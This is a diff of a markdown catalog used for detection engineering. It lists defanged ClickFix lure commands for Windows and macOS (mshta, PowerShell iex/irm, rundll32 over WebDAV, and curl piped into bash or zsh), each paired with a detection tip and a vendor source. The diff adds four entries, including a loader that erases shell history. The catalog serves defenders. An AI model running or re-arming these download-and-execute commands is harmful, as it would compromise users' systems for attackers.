@@ -1,14 +1,14 @@
 # ClickFix Command Catalog
 
 > ⚠️ **Defensive use only.** Every command below is a **DEFANGED** malicious sample kept for
-> **detection engineering and threat hunting**. URLs are neutralised (`hxxp`, `[.]`). **Do not execute.**
+> **detection engineering and threat hunting**. Malicious URLs *inside the commands* are neutralised (`hxxp`, `[.]`); source/reference links are normal, clickable URLs. **Do not execute.**
 
 ClickFix is a social-engineering technique where a victim is tricked (fake CAPTCHA / Cloudflare
 check, browser or document "error") into pasting and running an attacker-supplied command in the
 Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user's own permissions.
 
-- **Entries:** 31
-- **Last updated:** 2026-09-07
+- **Entries:** 35
+- **Last updated:** 2026-09-10
 - **Maintained by:** PAI ClickFix Tracker (daily) · source: [Sergio-Albea-Git/Threat-Hunting-KQL-Queries](https://github.com/Sergio-Albea-Git/Threat-Hunting-KQL-Queries)
 
 ## Commands
@@ -46,6 +46,10 @@ Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user
 | cf-0029 | `mshta.exe` | Fake 'Windows Update' ClickFix lure runs mshta against a hex-encoded-second-octet IP serving JScript from a non-.hta extension (.odd/.dat), which stages a PowerShell .NET steganographic loader hiding shellcode in PNG pixels (LummaC2/Rhadamanthys). | Huntress |
 | cf-0030 | `mshta.exe` | Fake 'Claude AI' installer ClickFix lure; victim pastes into Run dialog and mshta fetches a remote MSIX bundle payload leading to staged PowerShell + process injection | Rapid7 Labs |
 | cf-0031 | `powershell.exe` | FileFix (evolved ClickFix) — command pasted into the File Explorer address bar with a legit-looking path after '#'; uses legacy Microsoft.XMLHTTP COM to pull and iex-execute a remote PS1 in memory | Bridewell |
+| cf-0032 | `mshta.exe` | InstallFix: malvertised fake Claude Code / CLI install page pushes a full-path SysWOW64 mshta one-liner fetching remote HTA | Push Security (InstallFix) |
+| cf-0033 | `mshta.exe` | Fake AI installer (OpenAI Codex / Anthropic Claude pages on Google Sites) ClickFix lure runs mshta against a numeric-path remote HTA delivering an in-memory stealer | ITSEC Asia R&D / Intellibron |
+| cf-0034 | `powershell.exe` | Fake AI installer ClickFix lure clears the console then IEX-executes the .Content of an Invoke-WebRequest to a lookalike 'claudescript' domain (in-memory stealer) | ITSEC Asia R&D / Intellibron |
+| cf-0035 | `bash (macOS Terminal)` | macOS ClickFix fake CAPTCHA pastes a Terminal one-liner that curls an IP-hosted bash loader to a hidden /tmp dotfile, runs it, self-deletes, then scrubs scrollback and shell history to hide the crypto-draining stealer | Huntress |
 
 ### cf-0001 — `powershell.exe`
 
@@ -55,7 +59,7 @@ powershell -ep bypass -c "$repvar=(Get-Clipboard);Set-Clipboard;$repvar|iex|iex"
 
 - **Technique:** Clipboard self-execution — reads clipboard, clears it, and pipes to iex twice
 - **Detection:** PowerShell that calls Get-Clipboard then Invoke-Expression/iex in the same command line. Set-Clipboard with no argument (clipboard wipe) is a strong secondary signal.
-- **Source:** Group-IB / Sekoia — hxxps://blog.sekoia[.]io/clickfix-tactic-revenge-of-detection/
+- **Source:** Group-IB / Sekoia — https://blog.sekoia.io/clickfix-tactic-revenge-of-detection/
 - **Added:** 2026-08-12
 
 ### cf-0002 — `regsvr32.exe`
@@ -66,7 +70,7 @@ cmdkey /add:<host> /user:<user> /pass:<pass> & regsvr32 /s \\<host>\share\payloa
 
 - **Technique:** Fake Cloudflare CAPTCHA variant — stores creds with cmdkey, loads a DLL filelessly from an attacker SMB/UNC share; persistence via scheduled task 'RunNotepadNow'
 - **Detection:** regsvr32 loading a DLL from a UNC/SMB path (\\host\...); cmdkey /add immediately before; creation of scheduled task named RunNotepadNow.
-- **Source:** CyberProof (via Mallory / Rapid7 reporting) — hxxps://www.mallory[.]ai/stories/019c8f86-2a83-7716-b011-53cf9e940c23
+- **Source:** CyberProof (via Mallory / Rapid7 reporting) — https://www.mallory.ai/stories/019c8f86-2a83-7716-b011-53cf9e940c23
 - **Added:** 2026-08-12
 
 ### cf-0003 — `mshta.exe`
@@ -77,7 +81,7 @@ mshta hxxps://malicious[.]site/verify.hta
 
 - **Technique:** Remote HTA execution launched from the Run dialog after a fake 'verification' step
 - **Detection:** mshta.exe with a remote http(s) URL argument, spawned with a parent of explorer.exe (Run dialog) or a browser.
-- **Source:** Huntress — hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques
+- **Source:** Huntress — https://www.huntress.com/blog/dont-sweat-clickfix-techniques
 - **Added:** 2026-08-12
 
 ### cf-0004 — `conhost.exe`
@@ -88,7 +92,7 @@ conhost --headless powershell -w hidden -c "iex(iwr hxxps://bad[.]site/a)"
 
 - **Technique:** conhost --headless used to run a hidden PowerShell downloader without a visible window
 - **Detection:** Any execution of conhost.exe with the --headless argument is almost always malicious in this context.
-- **Source:** Huntress / Sekoia — hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques
+- **Source:** Huntress / Sekoia — https://www.huntress.com/blog/dont-sweat-clickfix-techniques
 - **Added:** 2026-08-12
 
 ### cf-0005 — `curl.exe`
@@ -99,7 +103,7 @@ curl hxxp://bad[.]site/a.exe -o %TEMP%\a.exe & start %TEMP%\a.exe
 
 - **Technique:** Native curl download of a payload to %TEMP% then immediate execution
 - **Detection:** curl.exe writing to %TEMP%/%APPDATA% followed by start/execution of the same path within seconds, parented off the Run dialog.
-- **Source:** Group-IB — hxxps://www.group-ib[.]com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/
+- **Source:** Group-IB — https://www.group-ib.com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/
 - **Added:** 2026-08-12
 
 ### cf-0006 — `bitsadmin.exe`
@@ -110,7 +114,7 @@ bitsadmin /transfer job hxxp://bad[.]site/a.exe %TEMP%\a.exe & %TEMP%\a.exe
 
 - **Technique:** BITS transfer used to fetch the payload, evading some download monitoring
 - **Detection:** bitsadmin /transfer to a user-writable path followed by execution; also visible as BITS job creation events.
-- **Source:** Huntress — hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques
+- **Source:** Huntress — https://www.huntress.com/blog/dont-sweat-clickfix-techniques
 - **Added:** 2026-08-12
 
 ### cf-0007 — `powershell.exe`
@@ -121,7 +125,7 @@ powershell -w hidden -EncodedCommand <base64>
 
 - **Technique:** Base64 -EncodedCommand to hide the real downloader/stager from casual inspection
 - **Detection:** powershell.exe with -EncodedCommand / -enc and -w hidden, especially with a RunMRU-originated parent chain. Decode the blob for the true command.
-- **Source:** CyberCentaurs — hxxps://cybercentaurs[.]com/blog/clickfix-malvertising-detection-threat-hunting/
+- **Source:** CyberCentaurs — https://cybercentaurs.com/blog/clickfix-malvertising-detection-threat-hunting/
 - **Added:** 2026-08-12
 
 ### cf-0008 — `msiexec.exe`
@@ -132,7 +136,7 @@ msiexec /q /i hxxps://bad[.]site/pkg.msi
 
 - **Technique:** Silent install of a remote MSI hosted on attacker infrastructure
 - **Detection:** msiexec.exe /i with a remote http(s) URL and /q (quiet); rare in normal user activity from the Run dialog.
-- **Source:** Group-IB — hxxps://www.group-ib[.]com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/
+- **Source:** Group-IB — https://www.group-ib.com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/
 - **Added:** 2026-08-12
 
 ### cf-0009 — `rundll32.exe`
@@ -143,7 +147,7 @@ rundll32 \\<host>\share\p.dll,Entry
 
 - **Technique:** rundll32 loading an exported entry point from a DLL on a remote UNC/WebDAV share
 - **Detection:** rundll32.exe with a UNC/WebDAV (\\host\... or \\host@SSL\...) module path and an export name.
-- **Source:** Sekoia — hxxps://blog.sekoia[.]io/clickfix-tactic-revenge-of-detection/
+- **Source:** Sekoia — https://blog.sekoia.io/clickfix-tactic-revenge-of-detection/
 - **Added:** 2026-08-12
 
 ### cf-0010 — `pcalua.exe`
@@ -154,7 +158,7 @@ pcalua -a \\<host>\share\p.exe
 
 - **Technique:** Program Compatibility Assistant used as a proxy to launch a remote binary and break the parent-child chain
 - **Detection:** pcalua.exe -a launching a binary, especially from a UNC path; unusual outside legacy-app troubleshooting.
-- **Source:** Huntress — hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques
+- **Source:** Huntress — https://www.huntress.com/blog/dont-sweat-clickfix-techniques
 - **Added:** 2026-08-12
 
 ### cf-0011 — `wt.exe`
@@ -165,7 +169,7 @@ wt.exe -p "Windows PowerShell" powershell -NoProfile -W Hidden -c "iwr hxxps://e
 
 - **Technique:** Fake CAPTCHA instructs Windows+X then I to open Windows Terminal (wt.exe) instead of Run, then paste/run PowerShell in a privileged shell that blends into admin workflows
 - **Detection:** Alert on wt.exe spawning powershell.exe/pwsh with network cmdlets (iwr/irm/iex); Terminal is rarely a parent of scripted download-and-execute
-- **Source:** Microsoft Threat Intelligence (Defender Experts) — hxxps://x[.]com/MsftSecIntel/status/2029692925118992473
+- **Source:** Microsoft Threat Intelligence (Defender Experts) — https://x.com/MsftSecIntel/status/2029692925118992473
 - **Added:** 2026-02-01
 
 ### cf-0012 — `cmd.exe`
@@ -176,7 +180,7 @@ cmd.exe /v:on /c "set x=pow&&set y=ershell&&call %windir%\SysWOW64\WindowsPowers
 
 - **Technique:** Fake Claude AI installer (MSIX) ClickFix; cmd splits the string 'powershell' across env vars with delayed expansion and calls 32-bit SysWOW64 PowerShell -E to evade string/path signatures
 - **Detection:** Hunt cmd.exe with /v:on and set-variable concatenation building 'powershell', or SysWOW64\...\v1.0\powershell.exe launched from cmd with -E/-EncodedCommand
-- **Source:** Rapid7 — hxxps://www[.]rapid7[.]com/blog/post/ve-clickfix-phishing-campaign-fake-claude-installer/
+- **Source:** Rapid7 — https://www.rapid7.com/blog/post/ve-clickfix-phishing-campaign-fake-claude-installer/
 - **Added:** 2026-07-01
 
 ### cf-0013 — `powershell.exe`
@@ -187,7 +191,7 @@ powershell -c "$m='ir'+'m';$e='ie'+'x';& $m hxxp://ghliczx[.]com/2[.]txt | & $e"
 
 - **Technique:** ClickFix PowerShell loader uses runtime string substitution to indirectly construct irm (Invoke-RestMethod) and iex, fetching staged content executed in-memory without touching disk
 - **Detection:** Flag PowerShell where cmdlet names are assembled via concatenation ('ir'+'m','ie'+'x') and invoked with & ; correlate with outbound GET to /1.txt or /2.txt style stagers
-- **Source:** Arctic Wolf — hxxps://arcticwolf[.]com/resources/blog/clickfix-campaign-exploits-powershell-loader-with-identifier-obfuscation-for-malicious-activity/
+- **Source:** Arctic Wolf — https://arcticwolf.com/resources/blog/clickfix-campaign-exploits-powershell-loader-with-identifier-obfuscation-for-malicious-activity/
 - **Added:** 2026-06-01
 
 ### cf-0014 — `cscript.exe`
@@ -198,7 +202,7 @@ curl.exe hxxp://<c2>/x.js -o %TEMP%\x.js & cscript %TEMP%\x.js
 
 - **Technique:** ClickFix (Latrodectus) pastes a curl.exe download of a JavaScript file to %TEMP%, then executes it via cscript to launch the loader
 - **Detection:** Hunt curl.exe writing .js to %TEMP%/Downloads immediately followed by cscript/wscript executing that file; cscript with a user-writable path argument is high-signal
-- **Source:** Palo Alto Unit 42 — hxxps://unit42[.]paloaltonetworks[.]com/preventing-clickfix-attack-vector/
+- **Source:** Palo Alto Unit 42 — https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/
 - **Added:** 2025-11-01
 
 ### cf-0015 — `bash (Terminal)`
@@ -209,7 +213,7 @@ curl -fsSL hxxps://svs-verificationdate[.]beer/<id> -o /tmp/<rand>.dmg && hdiuti
 
 - **Technique:** macOS ClickFix fake CAPTCHA; Terminal one-liner silently downloads a DMG to /tmp, mounts it with hdiutil -nobrowse, and auto-launches the bundled Atomic Stealer (AMOS) app
 - **Detection:** On macOS EDR, alert on curl -fsSL writing .dmg to /tmp followed by hdiutil attach -nobrowse and open of an app under /Volumes; chain within seconds of Terminal launch
-- **Source:** BleepingComputer / Microsoft Threat Intelligence — hxxps://www[.]bleepingcomputer[.]com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/
+- **Source:** BleepingComputer / Microsoft Threat Intelligence — https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/
 - **Added:** 2026-08-05
 
 ### cf-0016 — `bash (via Script Editor / Terminal)`
@@ -220,7 +224,7 @@ curl -fsSL hxxps://<domain>/curl/<id> | bash
 
 - **Technique:** Evolved macOS ClickFix retrieves a remote script from a /curl/<id> endpoint and pipes straight to bash through multi-stage scripts, increasingly launched via Script Editor rather than Terminal, ending in AMOS
 - **Detection:** Hunt curl piped directly to bash/sh with a /curl/ URL path; flag osascript/Script Editor (com.apple.ScriptEditor2) spawning curl or bash as anomalous parent
-- **Source:** Jamf Threat Labs / Microsoft Threat Intelligence — hxxps://www[.]jamf[.]com/blog/clickfix-macos-script-editor-atomic-stealer/
+- **Source:** Jamf Threat Labs / Microsoft Threat Intelligence — https://www.jamf.com/blog/clickfix-macos-script-editor-atomic-stealer/
 - **Added:** 2026-05-06
 
 ### cf-0017 — `rundll32.exe`
@@ -231,7 +235,7 @@ pushd \\looksta[.]icu@SSL\DavWWWRoot & rundll32 google.ct,Entry & popd
 
 - **Technique:** ACR Stealer ClickFix mounts an attacker WebDAV share over HTTPS with pushd, then rundll32 loads a remote DLL (odd extension e.g. .ct) directly from the DavWWWRoot mount
 - **Detection:** Alert on pushd to a \\host@SSL\DavWWWRoot UNC path and rundll32 loading a DLL with a non-.dll extension from a WebClient/WebDAV-mounted drive
-- **Source:** Microsoft Threat Intelligence — hxxps://www[.]microsoft[.]com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
+- **Source:** Microsoft Threat Intelligence — https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
 - **Added:** 2026-07-16
 
 ### cf-0018 — `powershell.exe`
@@ -242,7 +246,7 @@ powershell -c "iex(irm '151.240.151[.]126/rRlmZcaaZfAE3U2BaH' -UseBasicParsing)"
 
 - **Technique:** Fake Google/Cloudflare 'verify you are human' page poisons clipboard with an irm|iex one-liner that pulls a stager from a bare-IPv4 host (StealC/ResiLoader)
 - **Detection:** powershell.exe running Invoke-RestMethod/irm against a raw IPv4 URL with -UseBasicParsing and piping to iex, with no browser-trusted parent process
-- **Source:** Malwarebytes Threat Intelligence — hxxps://www.malwarebytes[.]com/blog/threat-intel/2026/07/fake-google-and-cloudflare-verification-pages-spread-multiple-malware-families
+- **Source:** Malwarebytes Threat Intelligence — https://www.malwarebytes.com/blog/threat-intel/2026/07/fake-google-and-cloudflare-verification-pages-spread-multiple-malware-families
 - **Added:** 2026-07-02
 
 ### cf-0019 — `zsh`
@@ -253,7 +257,7 @@ curl -kfsSL $(echo '<base64>'|base64 -D)|zsh
 
 - **Technique:** macOS 'Google Meet audio fix' ClickFix lure; a base64-encoded URL is decoded inline and the fetched script is piped straight into zsh
 - **Detection:** Terminal/zsh spawning curl with a command-substituted 'base64 -D' URL piped to a shell; hunt shell history for 'base64 -D' feeding curl|zsh
-- **Source:** Malwarebytes Threat Intelligence — hxxps://www.malwarebytes[.]com/blog/threat-intel/2026/07/fake-google-and-cloudflare-verification-pages-spread-multiple-malware-families
+- **Source:** Malwarebytes Threat Intelligence — https://www.malwarebytes.com/blog/threat-intel/2026/07/fake-google-and-cloudflare-verification-pages-spread-multiple-malware-families
 - **Added:** 2026-07-02
 
 ### cf-0020 — `powershell.exe`
@@ -264,7 +268,7 @@ powershell IEX ((Invoke-RestMethod -Uri hxxps://pharmacynod[.]com/Fix -Method GE
 
 - **Technique:** ClickFix one-liner retrieves JSON from a /Fix endpoint and executes the nested '.note.body' property to launch a multi-stage PowerShell-to-RAT chain
 - **Detection:** powershell using Invoke-RestMethod where a response object property (e.g. .note.body / .body) is passed directly to IEX
-- **Source:** Fortinet FortiGuard Labs — hxxps://www.fortinet[.]com/blog/threat-research/clickfix-to-command-a-full-powershell-attack-chain
+- **Source:** Fortinet FortiGuard Labs — https://www.fortinet.com/blog/threat-research/clickfix-to-command-a-full-powershell-attack-chain
 - **Added:** 2025-08-11
 
 ### cf-0021 — `rundll32.exe`
@@ -275,7 +279,7 @@ powershell IEX ((Invoke-RestMethod -Uri hxxps://pharmacynod[.]com/Fix -Method GE
 
 - **Technique:** ClickFix loads a DLL from an @SSL WebDAV share, disguised with a '.google' extension and invoked by ordinal '#1' (ACR Stealer WebDAV chain)
 - **Detection:** rundll32.exe loading a UNC path containing '@ssl' with a non-.dll file extension and an ordinal export (e.g. ',#1')
-- **Source:** Microsoft Defender Experts / Red Canary (via The Hacker News) — hxxps://www.microsoft[.]com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
+- **Source:** Microsoft Defender Experts / Red Canary (via The Hacker News) — https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
 - **Added:** 2026-07-16
 
 ### cf-0022 — `mshta.exe`
@@ -286,7 +290,7 @@ mshta hxxp://81[.]0x5a[.]29[.]64/ebc/rps.gz
 
 - **Technique:** Fake-CAPTCHA ClickFix pastes an mshta one-liner that pulls remote HTA/script content from a hex-octal-obfuscated IP literal (0x5a) with a non-.hta extension (.gz/.odd/.dat); leads to .NET loader that extracts shellcode hidden via steganography in a PNG.
 - **Detection:** Alert on mshta.exe whose command line contains a bare IPv4/hex-octal host (e.g. '0x' in the hostname) and remote paths ending in .gz/.dat/.odd instead of .hta; mshta rarely fetches remote content on endpoints.
-- **Source:** Huntress — hxxps://www[.]huntress[.]com/blog/clickfix-malware-buried-in-images
+- **Source:** Huntress — https://www.huntress.com/blog/clickfix-malware-buried-in-images
 - **Added:** 2026-07-01
 
 ### cf-0023 — `cmd.exe`
@@ -297,7 +301,7 @@ cmd /c curl naintn[.]com/amazoncdn[.]com/oeiich37874cj30dkk43885j10vj38h38jd/nrs
 
 - **Technique:** Fake-CAPTCHA ClickFix pastes a cmd one-liner that curls an attacker host whose URL path impersonates a trusted CDN (amazoncdn / cdn-dynmedia-1.microsoft.com) and pipes the response straight into powershell (no file drop, no iex); observed dropping Latrodectus and Supper.
 - **Detection:** Hunt for cmd.exe spawning curl.exe piped to powershell.exe where the URL host is a short unrelated domain but the path embeds 'amazoncdn'/'microsoft'/'cdn'; correlate with HKCU RunMRU entries.
-- **Source:** CERT Polska — hxxps://cert[.]pl/en/posts/2026/02/fake-captcha-in-action/
+- **Source:** CERT Polska — https://cert.pl/en/posts/2026/02/fake-captcha-in-action/
 - **Added:** 2026-02-01
 
 ### cf-0024 — `osascript`
@@ -308,7 +312,7 @@ curl -s hxxps://honestly[.]ink/<id> | osascript
 
 - **Technique:** macOS ClickFix 'fake utility' lure offers a one-click copy of an obfuscated curl one-liner that pipes a remotely fetched AppleScript directly into osascript (sibling variants pipe to zsh with base64+gzip+eval), bypassing Gatekeeper by never writing an app bundle; delivers infostealers with a t.me Telegram C2 fallback.
 - **Detection:** On macOS, alert when Terminal/osascript or zsh is the child of a curl|pipe execution fetching a remote script; inspect shell history and Unified Log for 'curl … | osascript' and lookups to honestly[.]ink / 0x666[.]info.
-- **Source:** Microsoft Threat Intelligence — hxxps://www[.]microsoft[.]com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
+- **Source:** Microsoft Threat Intelligence — https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
 - **Added:** 2026-05-06
 
 ### cf-0025 — `cmd.exe`
@@ -319,7 +323,7 @@ curl -s hxxps://honestly[.]ink/<id> | osascript
 
 - **Technique:** ClickFix pastes a cmd one-liner that mounts an attacker WebDAV server as drive Z:, runs a staged update.cmd loader, then unmaps the drive to clean up.
 - **Detection:** Alert on cmd.exe 'net use' mapping a drive letter to a raw-IP HTTPS/WebDAV path, immediately followed by execution of a .cmd/.bat from that mapped drive.
-- **Source:** Atos Threat Research (via The Hacker News) — hxxps://thehackernews[.]com/2026/03/investigating-new-click-fix-variant.html
+- **Source:** Atos Threat Research (via The Hacker News) — https://thehackernews.com/2026/03/investigating-new-click-fix-variant.html
 - **Added:** 2026-03-13
 
 ### cf-0026 — `rundll32.exe`
@@ -330,7 +334,7 @@ rundll32.exe \\data-x7-sync.neurosync[.]in[.]net@80\verification.google,#1
 
 - **Technique:** ClickFix loads a remote 32-bit DLL over the WebDAV mini-redirector using a UNC path with the @80 HTTP port qualifier and calls export ordinal #1 (SkimokKeep loader), avoiding PowerShell entirely.
 - **Detection:** Hunt for rundll32.exe with a UNC/WebDAV path containing '@80' or '@443'/'@SSL' and an ordinal export (',#1'); pair with new WebClient service starts and outbound WebDAV traffic.
-- **Source:** CyberProof — hxxps://www[.]cyberproof[.]com/blog/the-clickfix-evolution-new-variant-replaces-powershell-with-rundll32-and-webdav/
+- **Source:** CyberProof — https://www.cyberproof.com/blog/the-clickfix-evolution-new-variant-replaces-powershell-with-rundll32-and-webdav/
 - **Added:** 2026-03-19
 
 ### cf-0027 — `finger.exe`
@@ -341,7 +345,7 @@ finger gcaptcha@captchaver[.]top | cmd
 
 - **Technique:** Fake-CAPTCHA ClickFix uses the legacy finger.exe LOLBin to retrieve an attacker-hosted script over TCP/79 and pipes the response straight into cmd for execution (KongTuke and SmartApeSG campaigns).
 - **Detection:** Flag any finger.exe execution (rare on modern hosts), especially outbound TCP/79 to non-corporate hosts and finger.exe spawning cmd.exe or powershell.exe as a child.
-- **Source:** SANS Internet Storm Center (Johannes Ullrich) — hxxps://isc[.]sans[.]edu/diary/32566
+- **Source:** SANS Internet Storm Center (Johannes Ullrich) — https://isc.sans.edu/diary/32566
 - **Added:** 2025-12-13
 
 ### cf-0028 — `osascript (Script Editor via applescript:// scheme)`
@@ -352,7 +356,7 @@ curl -kSsfL hxxps://dryvecar[.]com/curl/04566d1d3f9717b2e7e6b643775d9ca72cef942f
 
 - **Technique:** macOS ClickFix uses an applescript:// URL to open Script Editor with a tr-obfuscated AppleScript that runs curl -kSsfL to fetch a gzip stager piped into zsh, ending in Atomic Stealer (AMOS).
 - **Detection:** Correlate Script Editor / osascript launching curl with -kSsfL to a '/curl/<hex>' path, followed by base64/gzip decode piped to zsh and xattr -c on a /tmp Mach-O.
-- **Source:** Jamf Threat Labs — hxxps://www[.]jamf[.]com/blog/clickfix-macos-script-editor-atomic-stealer/
+- **Source:** Jamf Threat Labs — https://www.jamf.com/blog/clickfix-macos-script-editor-atomic-stealer/
 - **Added:** 2026-04-08
 
 ### cf-0029 — `mshta.exe`
@@ -363,7 +367,7 @@ mshta hxxp://141[.]0x62[.]80[.]175/tick.odd
 
 - **Technique:** Fake 'Windows Update' ClickFix lure runs mshta against a hex-encoded-second-octet IP serving JScript from a non-.hta extension (.odd/.dat), which stages a PowerShell .NET steganographic loader hiding shellcode in PNG pixels (LummaC2/Rhadamanthys).
 - **Detection:** Hunt mshta.exe fetching URLs with hex-octet IPs (e.g. 0x62) and non-HTML extensions like .odd/.dat, then mshta spawning powershell.exe with in-memory download activity.
-- **Source:** Huntress — hxxps://www[.]huntress[.]com/blog/clickfix-malware-buried-in-images
+- **Source:** Huntress — https://www.huntress.com/blog/clickfix-malware-buried-in-images
 - **Added:** 2025-11-24
 
 ### cf-0030 — `mshta.exe`
@@ -374,7 +378,7 @@ mshta hxxp://download-version[.]1-5-8[.]com/claude.msixbundle
 
 - **Technique:** Fake 'Claude AI' installer ClickFix lure; victim pastes into Run dialog and mshta fetches a remote MSIX bundle payload leading to staged PowerShell + process injection
 - **Detection:** Alert on mshta.exe with a remote http/https URL argument, especially fetching .msixbundle/.msix; correlate with new entries in HKCU\...\Explorer\RunMRU
-- **Source:** Rapid7 Labs — hxxps://www[.]rapid7[.]com/blog/post/ve-clickfix-phishing-campaign-fake-claude-installer/
+- **Source:** Rapid7 Labs — https://www.rapid7.com/blog/post/ve-clickfix-phishing-campaign-fake-claude-installer/
 - **Added:** 2026-04-09
 
 ### cf-0031 — `powershell.exe`
@@ -385,8 +389,52 @@ powershell -w h -nop -c "$ic='hxxps://tersmoles[.]com/script.ps1';$w=New-Object 
 
 - **Technique:** FileFix (evolved ClickFix) — command pasted into the File Explorer address bar with a legit-looking path after '#'; uses legacy Microsoft.XMLHTTP COM to pull and iex-execute a remote PS1 in memory
 - **Detection:** Alert on explorer.exe or msedge.exe spawning powershell.exe that instantiates the Microsoft.XMLHTTP COM object and pipes responseBody to iex; hunt '-w h -nop' one-liners from browser/Explorer parents
-- **Source:** Bridewell — hxxps://www[.]bridewell[.]com/insights/blogs/detail/filefix-the-evolved-clickfix
+- **Source:** Bridewell — https://www.bridewell.com/insights/blogs/detail/filefix-the-evolved-clickfix
 - **Added:** 2025-08-22
+
+### cf-0032 — `mshta.exe`
+
+```text
+C:\Windows\SysWOW64\mshta.exe hxxps://claude.update-version[.]com/claude
+```
+
+- **Technique:** InstallFix: malvertised fake Claude Code / CLI install page pushes a full-path SysWOW64 mshta one-liner fetching remote HTA
+- **Detection:** Alert on mshta.exe launched with a full path (SysWOW64\mshta.exe) and an http(s) argument, especially parented by explorer.exe/Run dialog
+- **Source:** Push Security (InstallFix) — https://pushsecurity.com/blog/installfix
+- **Added:** 2026-03-06
+
+### cf-0033 — `mshta.exe`
+
+```text
+mshta hxxps://primemetricsa[.]com/1518925
+```
+
+- **Technique:** Fake AI installer (OpenAI Codex / Anthropic Claude pages on Google Sites) ClickFix lure runs mshta against a numeric-path remote HTA delivering an in-memory stealer
+- **Detection:** Hunt for mshta.exe with a remote URL ending in a bare numeric ID and follow-on INetCache\IE cached objects matching that ID
+- **Source:** ITSEC Asia R&D / Intellibron — https://blog.intellibron.io/fake-ai-installer-campaign-delivering-an-in-memory-stealer-via-the-clickfix-technique/
+- **Added:** 2026-06-30
+
+### cf-0034 — `powershell.exe`
+
+```text
+cls; iex(iwr claudescript[.]top UseBasicParsing).Content
+```
+
+- **Technique:** Fake AI installer ClickFix lure clears the console then IEX-executes the .Content of an Invoke-WebRequest to a lookalike 'claudescript' domain (in-memory stealer)
+- **Detection:** Flag PowerShell command lines pairing 'cls;' with iex(iwr ...).Content and -UseBasicParsing to a non-corporate TLD (.top)
+- **Source:** ITSEC Asia R&D / Intellibron — https://blog.intellibron.io/fake-ai-installer-campaign-delivering-an-in-memory-stealer-via-the-clickfix-technique/
+- **Added:** 2026-06-30
+
+### cf-0035 — `bash (macOS Terminal)`
+
+```text
+export SRC_URL='hxxps://profitnow[.]io/' && (cd /tmp && curl -kfsSL "hxxp://193.29.224[.]151/92392991a0cca55?force=1" -o .UlaccK && bash .UlaccK && rm -f .UlaccK) > /dev/null 2>&1 & clear; printf '\033[3J'; history -d $(history 1 2>/dev/null | awk '{print $1}') 2>/dev/null; fc -p /dev/null 2>/dev/null;
+```
+
+- **Technique:** macOS ClickFix fake CAPTCHA pastes a Terminal one-liner that curls an IP-hosted bash loader to a hidden /tmp dotfile, runs it, self-deletes, then scrubs scrollback and shell history to hide the crypto-draining stealer
+- **Detection:** On macOS, alert on Terminal-spawned curl to a raw IP writing a hidden dotfile in /tmp piped to bash, immediately followed by history -d / fc -p / printf '\033[3J' history-clearing
+- **Source:** Huntress — https://www.huntress.com/blog/mac-crypto-draining-malware
+- **Added:** 2026-08-06
 
 ## Threat Hunting (KQL — Microsoft Defender XDR)
 
